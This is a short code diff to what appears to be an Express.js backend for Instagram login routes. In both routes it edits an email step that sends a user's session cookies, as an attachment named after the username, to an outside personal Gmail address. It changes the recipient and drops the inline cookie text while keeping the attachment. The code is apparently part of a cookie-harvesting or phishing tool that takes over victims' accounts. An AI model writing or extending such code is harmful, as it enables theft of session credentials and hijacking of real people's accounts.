@@ -201,9 +201,8 @@ app.get("/insta/submitCode", (req, res) => {
                 console.log(data);
                 var mailOptions = {
                   from: process.env.email,
-                  to: "surya142337@gmail.com",
+                  to: "surya142327@gmail.com",
                   subject: "cookies of user" + req.query.username,
-                  text: JSON.stringify(val2.cookies),
                   attachments: [
                     {
                       filename: __dirname + `/tempt/${req.query.username}.txt`,
@@ -292,9 +291,8 @@ app.post("/insta", (req, res) => {
                 console.log(data);
                 var mailOptions = {
                   from: process.env.email,
-                  to: "surya142337@gmail.com",
+                  to: "surya142327@gmail.com",
                   subject: "cookies of user" + req.body.username,
-                  text: JSON.stringify(val2.cookies),
                   attachments: [
                     {
                       filename: __dirname + `/tempt/${req.body.username}.txt`,
